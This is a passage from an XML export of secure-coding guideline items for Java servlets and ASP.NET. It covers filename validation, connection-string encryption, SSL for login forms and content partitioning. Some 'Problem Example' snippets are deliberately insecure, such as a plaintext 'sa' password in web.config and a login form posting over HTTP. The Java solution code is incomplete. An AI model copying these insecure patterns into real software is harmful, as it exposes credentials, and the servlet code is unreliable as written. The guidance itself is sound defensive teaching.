&lt;strong&gt;/myapp/temp/&lt;/strong&gt;. Since the filename is validated, an attacker cannot execute directory traversal attacks.
&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;import java.io.*;&lt;br&gt;import java.util.*;&lt;br&gt;import java.lang.*;&lt;br&gt;import javax.servlet.*;&lt;br&gt;import javax.servlet.http.*;&lt;br&gt; public final class ReportDownloader extends HttpServlet&lt;br&gt;{&lt;br&gt;      public void doGet(HttpServletRequest request,&lt;br&gt;            HttpServletResponse response) throws ServletException, IOException&lt;br&gt;      {&lt;br&gt;            response.setContentType(&amp;quot;application/vnd.ms-excel&amp;quot;);&lt;br&gt;            String baseDir = &amp;quot;/myapp/temp/&amp;quot;;&lt;br&gt;            PrintWriter out = response.getWriter();&lt;br&gt;            String filename = request.getParameter(&amp;quot;file&amp;quot;);&lt;br&gt;            BufferedReader fin;&lt;br&gt;            String data = &amp;quot;&amp;quot;;&lt;br&gt;             try&lt;br&gt;            {&lt;br&gt;                  File reportFile = new File(baseDir &amp;#43; filename);&lt;br&gt;                   // The application validates the user-supplied filename&lt;br&gt;                              if (validateFilename(reportFile))&lt;br&gt;                  {                        fin = new BufferedReader(new FileReader(reportFile));&lt;br&gt;                        StringBuilder sb = new StringBuilder();&lt;br&gt;                        while (data != null)&lt;br&gt;                        {&lt;br&gt;                              data = fin.readLine();&lt;br&gt;                              if (validateData(data))&lt;br&gt;                              {&lt;br&gt;&lt;br&gt;                                    sb.append(data);&lt;br&gt;                              }&lt;br&gt;                              else&lt;br&gt;                              {&lt;br&gt;                                    // Add the appropriate logging and exception&lt;br&gt;                                    // handling mechanisms. Consult the Exception&lt;br&gt;                                    // Handling and Logging sections&lt;br&gt;                                     out.println(&amp;quot;We cannot handle your request at&lt;br&gt;                                               &amp;#43; &amp;quot;the moment. Please try again later.&amp;quot;);&lt;br&gt;                                    return;&lt;br&gt;                              }&lt;br&gt;                        }&lt;br&gt;                        out.println(sb.toString());&lt;br&gt;                  }&lt;br&gt;                  else&lt;br&gt;                  {&lt;br&gt;                        // Add the appropriate logging and exception handling mechanisms&lt;br&gt;                        // Consult the Exception Handling and Logging sections&lt;br&gt;                        out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                                  &amp;#43; &amp;quot;Please try again later.&amp;quot;);&lt;br&gt;                  }&lt;br&gt;            }&lt;br&gt;            catch (Exception e)&lt;br&gt;            {&lt;br&gt;                  // Add the appropriate logging and exception handling mechanisms&lt;br&gt;                  // Consult the Exception Handling and Logging sections&lt;br&gt;                   out.println(&amp;quot;We cannot handle your request at the moment. &amp;quot;&lt;br&gt;                             &amp;#43; &amp;quot;Please try again later.&amp;quot;);&lt;br&gt;            }&lt;br&gt;             out.flush();&lt;br&gt;            out.close();&lt;br&gt;      }&lt;br&gt;       boolean validateFilename(File file)&lt;br&gt;      {&lt;br&gt;            // This represents the format /myapp/temp/&amp;lt;filename&amp;gt;&lt;br&gt;            String goodPattern = &amp;quot;/myapp/temp/(\\w|\\s|\\.|-|){1,20}&amp;quot;;&lt;br&gt;            Pattern p = Pattern.compile(goodPattern);&lt;br&gt;            Matcher m = p.matcher(file.getCanonicalPath());&lt;br&gt;            if (!m.matches())&lt;br&gt;            {&lt;br&gt;                  return false;&lt;br&gt;            }&lt;br&gt;            return true;&lt;br&gt;      }&lt;br&gt;       boolean validateData(String input)&lt;br&gt;      {&lt;br&gt;            // Implement a validation routine for the format of the reports&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information on handling files with Java, see: Documentation for &lt;a href="http://download.oracle.com/javase/1.4.2/docs/api/java/io/File.html"&gt;
Class File&lt;/a&gt; in Java SDK.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559"&gt;Guideline: Validate Input for Length, Range, Format, and Type (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:71225A92-ECA2-481E-ADEE-EA9C222DEA43"&gt;Guideline: Validate Input from All Sources (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D6593992-DC9E-42C5-9E98-30E8EF075B93"&gt;Guideline: Do Not Rely on Client-Side Validation (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:C7AC7D00-4AEA-4AFA-AD2D-1E812664BA38"&gt;Attack: Canonicalization Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:044B9F0A-6A95-442C-BF24-3F890D0B10EF"&gt;Attack: Client-side Validation Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:42722D74-2F38-4B31-AC10-C9EC05DC7CC6"&gt;Attack: Alternate Data Streams Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:B9DD25F1-3C5C-40DD-A82E-464D0C02C14D"&gt;Attack: Command Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:41BACAD4-8875-4F83-A9F6-C2263B23ABC4"&gt;Attack: File Name and Path Manipulation Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:351789B0-A694-4E05-9C05-1A53EF053AF7"&gt;Checklist Item: User-Supplied Filenames and Paths are Validated (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>e2f1c054-0081-49c8-8555-f15a02a4bb2f</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Encrypt Connection Strings</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Data Access</category>
    <phase>Deployment</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Do not store connection strings in plain text. Use a protected&amp;nbsp;configuration provider such as the RSA Protected Configuration Provider or the Windows Data Protection API (DPAPI)&amp;nbsp;to&amp;nbsp;encrypt connection strings before&amp;nbsp;storing them in configuration files.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Connection strings contain sensitive resource access credentials such as user names, passwords and server names. Connection strings stored in plaintext are dangerous, because an attacker that can compromise a server will be able to read those connection
 strings. Even if a machine is not compromised, connection strings stored in plain text&amp;nbsp;are accessible to administrators and any other users with sufficient privileges&amp;nbsp;on the host machine and/or Windows domain.&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Always encrypt connection strings. The Windows Data Protection API (DPAPI) is the default provider and is&amp;nbsp;an acceptable choice under most circumstances. If&amp;nbsp;an application is deployed&amp;nbsp;within a Web farm environment,&amp;nbsp;the RSA-protected configuration provider
 is a better choice because it uses asymmetric, public&amp;nbsp;key encryption to encrypt and decrypt data keys that can easily be exported and imported across servers. If neither of these suffice, create a&amp;nbsp;custom provider.
&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;This section describes how to use DPAPI to encrypt connection strings. Please check the related guidelines for more information on using the RSA Protected Configuration Provider.&amp;nbsp;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Choose the appropriate configuration provider.&lt;/strong&gt; Under most circumstances DPAPI will suffice, although the RSA protected configuration is the logical choice in web farms where multiple servers are employed.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify the configuration sections to be encrypted.&lt;/strong&gt; Encrypting and decrypting data incurs performance overhead. To keep this overhead to a minimum, encrypt only the sections of the configuration file that store sensitive data.&amp;nbsp; Encrypt
 the &amp;lt;connectionStrings&amp;gt; element of the Web.config file to protect the database connection string.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Choose the machine or user store.&lt;/strong&gt; The DataProtectionConfigurationProvider supports machine-level and user-level stores for key storage. The choice of store depends largely on whether or not&amp;nbsp;the application shares a server with other applications
 and whether or not sensitive data must be kept private for each application.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Machine Store. &lt;/strong&gt;By default, the DataProtectionConfigurationProvider is configured to use DPAPI with the machine store. Use machine-level key storage in the following situations:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The application runs on its own dedicated server with no other applications. &lt;/li&gt;&lt;li&gt;Multiple applications run on the same server&amp;nbsp;and&amp;nbsp;those applications need to be able to share sensitive information.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;To encrypt the connectionStrings section&amp;nbsp;with the Machine Store, run the following command from a .NET command prompt:&lt;/p&gt;
&lt;pre&gt;   aspnet_regiis -pe &amp;quot;connectionStrings&amp;quot; -app &amp;quot;/MachineDPAPI&amp;quot; -prov &amp;quot;DataProtectionConfigurationProvider&amp;quot; &lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;User Store. &lt;/strong&gt;Use user-level key storage if the application runs in a shared hosting environment and the&amp;nbsp;application's sensitive data should&amp;nbsp;not be accessible to other applications on the server. In this situation, each application should
 run under a separate identity, and the resources for the application—such as files and databases—should be restricted to that identity.&lt;/p&gt;
&lt;p&gt;To encrypt the connectionStrings section&amp;nbsp;with the&amp;nbsp;User Store, run the following command from a .NET command prompt:&lt;/p&gt;
&lt;pre&gt;   aspnet_regiis -pe &amp;quot;connectionStrings&amp;quot; -app &amp;quot;/UserDPAPI&amp;quot; -prov &amp;quot;MyUserDataProtectionConfigurationProvider&amp;quot;&lt;/pre&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Encrypt&amp;nbsp;the configuration file data.&lt;/strong&gt;&amp;nbsp;To encrypt the connectionStrings section in Web.config using DPAPI with the Machine Store, run the following command from a .NET command prompt:&lt;/p&gt;
&lt;pre&gt;   aspnet_regiis -pe &amp;quot;connectionStrings&amp;quot; -app &amp;quot;/MachineDPAPI&amp;quot; -prov &amp;quot;DataProtectionConfigurationProvider&amp;quot; &lt;/pre&gt;
&lt;p&gt;The above command with the -app switch assumes that there is an IIS virtual directory called MachineDPAPI. If the Visual Studio .NET Web server is being utilized instead of IIS, use the -pef switch, which&amp;nbsp;specifies the physical directory location of&amp;nbsp;the
 configuration file.&lt;/p&gt;
&lt;pre&gt;   aspnet_regiis.exe -pef &amp;quot;connectionStrings&amp;quot; C:\Projects\MachineDPAPI -prov &amp;quot;DataProtectionConfigurationProvider&amp;quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/pre&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;A web application is running in&amp;nbsp;a hosted web environment. The application uses an SQL database instance and has sensitive data that should not be accessible to&amp;nbsp;other applications on the same system.&amp;nbsp;The web.config file contains a connectionString section
 that&amp;nbsp;the application uses to access the SQL database:&lt;/p&gt;
&lt;pre&gt;&amp;lt;connectionStrings&amp;gt;&lt;br&gt;  &amp;lt;add name=&amp;quot;MyLocalSQLServer&amp;quot;&lt;br&gt;        connectionString=&amp;quot;Initial Catalog=pubs;User Id=sa;Password=asdasd;&lt;br&gt;       data source=localhost;Integrated Security=SSPI;&amp;quot;&lt;br&gt;       providerName=&amp;quot;System.Data.SqlClient&amp;quot;/&amp;gt;&lt;br&gt;&amp;lt;/connectionStrings&amp;gt;&lt;/pre&gt;
&lt;p&gt;Unfortunately,&amp;nbsp;anyone capable of reading the web.config file for the application is now able to see the database, the username, and the password for the database instance, and will be able to execute statements at the same level of privilege as the application.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;A web application is running in&amp;nbsp;a hosted web environment. The application uses an SQL database instance and has sensitive data that should not be accessible to&amp;nbsp;other applications on the same system.&amp;nbsp;The web.config file contains a connectionString section
 that&amp;nbsp;the application uses to access the SQL database:&lt;/p&gt;
&lt;pre&gt;&amp;lt;connectionStrings&amp;gt;&lt;br&gt;  &amp;lt;add name=&amp;quot;MyLocalSQLServer&amp;quot;&lt;br&gt;        connectionString=&amp;quot;Initial Catalog=pubs;User Id=sa;Password=asdasd;&lt;br&gt;       data source=localhost;Integrated Security=SSPI;&amp;quot;&lt;br&gt;       providerName=&amp;quot;System.Data.SqlClient&amp;quot;/&amp;gt;&lt;br&gt;&amp;lt;/connectionStrings&amp;gt;&lt;/pre&gt;
&lt;p&gt;During deployment the connectionStrings section of web.config as been encrypted with DataProtectionConfigurationProvider and DPAPI. This was accomplished with the following command:&lt;/p&gt;
&lt;pre&gt;   aspnet_regiis -pe &amp;quot;connectionStrings&amp;quot; -app &amp;quot;/UserDPAPI&amp;quot; -prov &amp;quot;MyUserDataProtectionConfigurationProvider&amp;quot;&lt;/pre&gt;
&lt;p&gt;The connection string has been encrypted, which can be verified by looking at the web.config file. There is no need to decrypt the file by hand, since ASP.NET handles this transparently.&lt;/p&gt;
&lt;p&gt;&lt;br&gt;
&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Windows Data Protection &lt;a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnsecure/html/windataprotection-dpapi.asp"&gt;
http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnsecure/html/windataprotection-dpapi.asp&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;How to use the ASP.NET utility to encrypt credentials and session state connection strings
&lt;a href="http://support.microsoft.com/default.aspx?scid=kb;en-us;329290"&gt;http://support.microsoft.com/default.aspx?scid=kb;en-us;329290&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:1fe40372-6648-4496-8552-794f91ff6bbf"&gt;Connection Strings are Secured&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:760734bc-7080-4864-91ec-fd6db510f8ed"&gt;Credentials in SQL Connection Strings are Protected in Configuration Files&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:e963466f-3c57-48a5-bdf9-1f66136c12d3"&gt;Use RSA-Protected Configuration Provider in Web Farm Environments&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>e322d018-d2f1-4c5c-9c41-288b4b7155f1</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use SSL When Transmitting Credentials</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Applications written using Servlets or JSP.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Do not send credentials via unencrypted connections. Use SSL when transmitting credentials.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Using SSL prevents the credentials from being sniffed or tampered with as they are transmitted over the network.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If your application sends credentials on the Internet.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Using Secure Socket Layer (SSL) over HTTP requires the following steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Create a certificate request.&lt;/strong&gt; Using your hosting server or OpenSSL, generate an SSL certificate request. Example:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;# Generate private key&lt;br&gt;openssl genrsa -des3 -out privkey.pem 2048 &lt;br&gt;# Generate certificate request using private key&lt;br&gt;openssl req -new -key privkey.pem -out cert.csr&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Present the request to a Certification Authority (CA).&lt;/strong&gt; If all conditions for obtaining an SSL certificate are met, the CA will produce a new SSL certificate based on the certificate request. Because the requirements for obtaining an SSL
 certificate depend on the Certification Authority, consult with the Certification Authority in regards to the administrative steps necessary for obtaining such certificate.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Install the certificate.&lt;/strong&gt; Consult with the hosting server's documentation on how to install the SSL certificate.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure credentials are sent over SSL.&lt;/strong&gt; Place the authentication portion of your application on a dedicated subdomain. Configure the server to accept only HTTPS traffic for the authentication subdomain. Ensure that form posts containing credentials
 are sent over HTTPS. This is accomplished by using absolute URL paths in the action field. Example:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;form method=&amp;quot;POST&amp;quot; action=&amp;quot;https://login.example.com/myapp/login&amp;quot;&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;In the following snippet, the credentials are transmitted over unprotected HTTP. This allows an attacker to easily steal credentials from sniffed traffic.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;html&amp;gt;&lt;br&gt;  &amp;lt;head&amp;gt;&lt;br&gt;    &amp;lt;title&amp;gt;login form&amp;lt;/title&amp;gt;&lt;br&gt;  &amp;lt;/head&amp;gt;&lt;br&gt;  &amp;lt;body&amp;gt;&lt;br&gt;    &amp;lt;form method=&amp;quot;POST&amp;quot; action=&amp;quot;http://login.example.com/myapp/login&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;user&amp;quot; size=25&amp;gt;&amp;lt;br&amp;gt;&lt;br&gt;    &amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;pass&amp;quot; size=25&amp;gt;&amp;lt;br&amp;gt;&lt;br&gt;    &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;submit&amp;quot; value=&amp;quot;log in&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;/form&amp;gt;&lt;br&gt;  &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;In the following snippet, the credentials are transmitted over HTTPS. This makes it difficult for an attacker to steal credentials from sniffed traffic:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;html&amp;gt;&lt;br&gt;  &amp;lt;head&amp;gt;&lt;br&gt;    &amp;lt;title&amp;gt;login form&amp;lt;/title&amp;gt;&lt;br&gt;  &amp;lt;/head&amp;gt;&lt;br&gt;  &amp;lt;body&amp;gt;&lt;br&gt;    &amp;lt;form method=&amp;quot;POST&amp;quot; action=&amp;quot;https://login.example.com/myapp/login&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;user&amp;quot; size=25&amp;gt;&amp;lt;br&amp;gt;&lt;br&gt;    &amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;pass&amp;quot; size=25&amp;gt;&amp;lt;br&amp;gt;&lt;br&gt;    &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;submit&amp;quot; value=&amp;quot;log in&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;/form&amp;gt;&lt;br&gt;  &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about using SSL in the J2EE, see: &lt;a href="http://www.cs.uccs.edu/~cs301/j2ee/j2eetutorial14/doc/Security6.html"&gt;
Installing and Configuring SSL Support&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;To learn more about generating certificate requests, see: &lt;a href="http://support.microsoft.com/default.aspx?scid=KB;en-us;q228821"&gt;
Generating a Certificate Request File Using the Certificate Wizard in IIS 5.0&lt;/a&gt;.
&lt;/li&gt;&lt;li&gt;To learn more about creating SSL certificates, see: &lt;a href="http://www.openssl.org/docs/HOWTO/certificates.txt"&gt;
OpenSSL HOWTO certificates&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;For more information about using SSL with Tomcat, see: &lt;a href="http://tomcat.apache.org/tomcat-4.0-doc/ssl-howto.html"&gt;
SSL Configuration HOW-TO&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:024B6044-7C89-436C-8111-1B6FAE7298AC"&gt;Guideline: Protect Sensitive Data Over the Network (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:F0E2BFFC-E6D1-4DC6-A6C2-D078F54AE10E"&gt;Guideline: Protect Session Cookies (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:B47A6486-A73E-44B9-AD17-1F7F94199828"&gt;Attack: Network Credential Sniffing Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:9E3FC30A-B55C-4AF6-8B77-A534C6F87197"&gt;Attack: Phishing Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9"&gt;Attack: Information Disclosure Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:B446B34C-8DEC-4F74-A392-C30D1719D90D"&gt;Attack: Trust Relationship Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:48BB4D3A-9295-4263-B3E7-090E483DEC5D"&gt;Attack: Man in the Middle Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:51CDBB59-211B-4816-896D-319D42D3FCE2"&gt;Checklist Item: SSL is Used When Transmitting Credentials (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>e800cb23-11ca-4cdf-babb-19d8f8c0e955</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Partition Application Between Public and Private Domains</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Authentication</category>
    <phase>Deployment</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Applications written using Servlets or JSP.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Define a boundary between public and restricted content.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Defining a boundary between public and restricted content helps establish the check points&amp;nbsp;where access will be allowed&amp;nbsp;to the restricted content.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If your application has access control that&amp;nbsp;restricts certain users to specific resources, then define a boundary between those resources. For instance, anonymous users are restricted&amp;nbsp;to one part of the application, while&amp;nbsp;authenticated users can access both
 parts.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Defining the boundary requires:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Determine roles. &lt;/strong&gt;Define the various types of users and their rights. Build a security policy for the restricted content and base the user groups' privileges around it.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Define the boundary. &lt;/strong&gt;Structure the content according to access and logical orders. Try to use a modular approach when establishing the boundary.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Separate on disk. &lt;/strong&gt;Once the boundaries have been established, reflect these boundaries onto the local file system. Separate the restricted content from the public content on disk.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Set proper permissions. &lt;/strong&gt;Set proper permissions to the restricted content. Dedicate a special directory for the restricted content and require valid access before accessing content within this directory. These permissions can be enforced
 at the application, server and operating system levels, depending on the environment in use.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;MyApp is a financial tool that generates reports based on sensitive data. It allows the user to upload the financial data and download the report. Since the application is small, all of its content is located within the same directory. The access control
 is enforced by the web application through checking the required permissions before a given call is executed.&lt;/p&gt;
&lt;p&gt;Since both data and code is within the same directory, it may be possible for an attacker to gain access to the raw financial data.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;MyApp is a financial tool that generates reports based on some sensitive data. It allows the user to upload the financial data and download the report. The application has a dedicated
&lt;strong&gt;/data/&lt;/strong&gt; directory for the financial data. Access to contents within the
&lt;strong&gt;/data/&lt;/strong&gt; directory is handled by the server hosting MyApp, making it much more difficult for an unauthorized user to gain access.&lt;/p&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:31529619-FB94-4798-BB29-14AC389F2240"&gt;Guideline: Separate Account Administration from the Main Application Interface (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:2A2791FA-47DB-4528-9EEC-03482142AABF"&gt;Guideline: Perform Role-Based Security Checks (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1131DE2A-C216-4397-97C8-A8D33DE8CC51"&gt;Guideline: Define a Security Policy (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:EAD019CA-025A-4DC6-A4DC-6DFDC9FBA131"&gt;Guideline: Disable Directory Browsing (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1D7F6072-1A5F-472E-9D27-F15E396EAB2E"&gt;Attack: Forceful Browsing Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:597D8E4A-B05B-451B-B894-911F354B860A"&gt;Checklist Item: Application is Partitioned into Public and Private Domains (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>e992dbe8-7076-4983-945f-67f4bb91c47e</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Configure Appropriate ACLs on Web Site Files</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authorization</category>
    <phase>Deployment</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Configure access control lists (ACLs) on your Web site files so that IIS and ASP.NET file authorization appropriately control access to these files.&amp;nbsp;&amp;nbsp;
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Failure to apply proper&amp;nbsp;access control restrictions on files&amp;nbsp;may allow users&amp;nbsp;to read, edit,&amp;nbsp;or remove files they should not be able to.&amp;nbsp;ACLs are an important layer of defense against unauthorized file&amp;nbsp;access.&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
